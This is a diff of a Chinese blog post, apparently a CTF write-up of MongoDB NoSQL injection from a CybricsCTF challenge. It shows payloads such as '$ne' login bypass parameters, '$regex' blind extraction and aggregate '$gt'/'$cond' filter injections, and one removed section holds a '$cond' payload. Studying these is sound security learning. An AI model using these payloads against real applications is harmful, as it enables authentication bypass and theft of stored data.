@@ -92,7 +92,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/08/13/mongodb注入/1.png">
 <meta property="og:image" content="http://yoursite.com/2019/08/13/mongodb注入/2.png">
 <meta property="og:image" content="http://yoursite.com/2019/08/13/mongodb注入/3.png">
-<meta property="og:updated_time" content="2019-08-14T05:44:27.634Z">
+<meta property="og:updated_time" content="2019-10-11T07:59:34.045Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mongodb注入">
 <meta name="twitter:description" content="mongodb注入cybircsctf的一道nopesql，开始没想到是mongodb注入，某天惊奇地发现题目还没关，复现一下，学习一下mongodb注入">
@@ -395,7 +395,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  2.2k 字
+                  2.1k 字
                 </span>
               
 
@@ -468,12 +468,48 @@ $query = &quot;db.table.update({&apos;newsid&apos;:1},{&apos;newsid&apos;,2})&qu
 
 $result = $db-&gt;execute($query);
 </code></pre><h3 id="shell和php"><a href="#shell和php" class="headerlink" title="shell和php"></a>shell和php</h3><pre><code>php语句
-$db-&gt;find([&quot;num&quot;=&gt;[&apos;$gt&apos;=&gt;2],&quot;name&quot;=&gt;&quot;test_3&quot;])
+
+    $db-&gt;find([&quot;num&quot;=&gt;[&apos;$gt&apos;=&gt;2],&quot;name&quot;=&gt;&quot;test_3&quot;])
+
 shell语句
-b.tr1ple.find({&apos;num&apos;:{&quot;$gt&quot;:2},&apos;name&apos;:&apos;test_3&apos;})
+
+    b.tr1ple.find({&apos;num&apos;:{&quot;$gt&quot;:2},&apos;name&apos;:&apos;test_3&apos;})
+
 相当于sql语句
-select * from tr1ple where num&gt;2 and name=&quot;test_3&quot;
-</code></pre><h3 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h3><h4 id="数组注入"><a href="#数组注入" class="headerlink" title="数组注入"></a>数组注入</h4><pre><code>#!php
+
+    select * from tr1ple where num&gt;2 and name=&quot;test_3&quot;
+</code></pre><h3 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h3><p>mongodb条件操作符</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">操作符</th>
+<th style="text-align:center">对应</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">$lt</td>
+<td style="text-align:center">&lt;</td>
+</tr>
+<tr>
+<td style="text-align:center">$lte</td>
+<td style="text-align:center">&lt;=</td>
+</tr>
+<tr>
+<td style="text-align:center">$ne</td>
+<td style="text-align:center">!=</td>
+</tr>
+<tr>
+<td style="text-align:center">$gt</td>
+<td style="text-align:center">&gt;</td>
+</tr>
+<tr>
+<td style="text-align:center">$gte</td>
+<td style="text-align:center">&gt;=</td>
+</tr>
+</tbody>
+</table>
+<h4 id="数组注入"><a href="#数组注入" class="headerlink" title="数组注入"></a>数组注入</h4><pre><code>#!php
 &lt;?php
 $mongo = new mongoclient();
 $db = $mongo-&gt;myinfo; //选择数据库
@@ -504,11 +540,18 @@ else{
 <pre><code>?username[$ne]=test&amp;password[$ne]=test
 </code></pre><p>相当于执行了</p>
 <pre><code>db.test.find({username:{‘$ne’:’test’},password:{‘$ne’:’test’}});  
-</code></pre><p>mongodb条件操作符<br>“$lt”, “$lte”, “$gt”, “$gte”, “$ne”对应了  “&lt;”, “&lt;=”, “&gt;”, “&gt;=”,”!=”。<br>相当于对username!=test，password!=test的查询<br>此处是字符的比较，比较的是字符的ascii值</p>
-<pre><code>对应sql语句：select * from test where username!=’test’ and password!=’test’;
-</code></pre><p>返回所有username!=test，password!=test的结果<br>如果读取后并没有回显，我们可以采取$regex操作符来一位一位获取数据。</p>
-<pre><code>传递参数为 username[$regex]=^a
-对应的操作为db.test.find({username:{‘$regex’:’^a’},password:{‘$regex’:’^a’}})
+</code></pre><p>相当于对username!=test，password!=test的查询<br>此处是字符的比较，比较的是字符的ascii值</p>
+<p>对应sql语句：</p>
+<pre><code>select * from test where username!=’test’ and password!=’test’;
+</code></pre><p>返回所有username!=test，password!=test的结果  </p>
+<p>如果读取后并没有回显，我们可以采取$regex操作符来一位一位获取数据。</p>
+<pre><code>传递参数为 
+
+username[$regex]=^a
+
+对应的操作为
+
+db.test.find({username:{‘$regex’:’^a’},password:{‘$regex’:’^a’}})
 </code></pre><p>从第一位开始，^a,^a1,^a13 ……</p>
 <h4 id="拼接字符串时的注入"><a href="#拼接字符串时的注入" class="headerlink" title="拼接字符串时的注入"></a>拼接字符串时的注入</h4><pre><code>#!php
 &lt;?php
@@ -670,6 +713,7 @@ comedy has 5 news
 <pre><code>?filter[$gt][0]=$text&amp;filter[$gt][1]=c
 </code></pre><p>相当于</p>
 <pre><code>[&apos;$project&apos; =&gt; [&apos;category&apos; =&gt; [$gt =&gt; [&quot;text&quot;, &quot;c&quot;]]]]
+
 后面的c为text分组内的内容，所以前后参数都要为$gt
 </code></pre><p>payload是</p>
 <pre><code>?filter[$gt][0]=$text&amp;filter[$gt][1]=cy
@@ -678,9 +722,6 @@ comedy has 5 news
 </code></pre><p>则显示<br><img src="/2019/08/13/mongodb注入/3.png" alt=" "></p>
 <p>就可以写脚本得到flag</p>
 <p>得到flag后也可以对此进行验证<br>    ?filter[$ne][0]=$text&amp;filter[$ne][1]=cybrics{7|-|15 15 4 7E&gt;&lt;7 |=|_49}</p>
-<h4 id="拼接字符注入"><a href="#拼接字符注入" class="headerlink" title="拼接字符注入"></a>拼接字符注入</h4><p>在mongodb的aggregate中，可以使用$cond进行条件语句：<br>    [$cond][if][$eq]条件语句</p>
-<pre><code>?filter[$cond][if][$eq][0]=$category&amp;filter[$cond][if][$eq][1]=flags&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=$category
-</code></pre><p>我们直接输出flag中的text内容，$category和他分组内的内容要在同一数组中</p>
 
       
     </div>
@@ -720,6 +761,10 @@ comedy has 5 news
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/08/htaccess文件解析/" rel="prev" title="文件解析漏洞">
+                文件解析漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -799,7 +844,7 @@ comedy has 5 news
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">22</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -935,7 +980,7 @@ comedy has 5 news
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#mongodb注入"><span class="nav-number">1.</span> <span class="nav-text">mongodb注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mongodb"><span class="nav-number">1.1.</span> <span class="nav-text">mongodb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shell和php"><span class="nav-number">1.2.</span> <span class="nav-text">shell和php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入方式"><span class="nav-number">1.3.</span> <span class="nav-text">注入方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#数组注入"><span class="nav-number">1.3.1.</span> <span class="nav-text">数组注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#拼接字符串时的注入"><span class="nav-number">1.3.2.</span> <span class="nav-text">拼接字符串时的注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题目"><span class="nav-number">1.4.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#登陆部分"><span class="nav-number">1.4.1.</span> <span class="nav-text">登陆部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询部分"><span class="nav-number">1.4.2.</span> <span class="nav-text">查询部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数组盲注"><span class="nav-number">1.4.3.</span> <span class="nav-text">数组盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#拼接字符注入"><span class="nav-number">1.4.4.</span> <span class="nav-text">拼接字符注入</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#mongodb注入"><span class="nav-number">1.</span> <span class="nav-text">mongodb注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mongodb"><span class="nav-number">1.1.</span> <span class="nav-text">mongodb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shell和php"><span class="nav-number">1.2.</span> <span class="nav-text">shell和php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入方式"><span class="nav-number">1.3.</span> <span class="nav-text">注入方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#数组注入"><span class="nav-number">1.3.1.</span> <span class="nav-text">数组注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#拼接字符串时的注入"><span class="nav-number">1.3.2.</span> <span class="nav-text">拼接字符串时的注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题目"><span class="nav-number">1.4.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#登陆部分"><span class="nav-number">1.4.1.</span> <span class="nav-text">登陆部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询部分"><span class="nav-number">1.4.2.</span> <span class="nav-text">查询部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数组盲注"><span class="nav-number">1.4.3.</span> <span class="nav-text">数组盲注</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
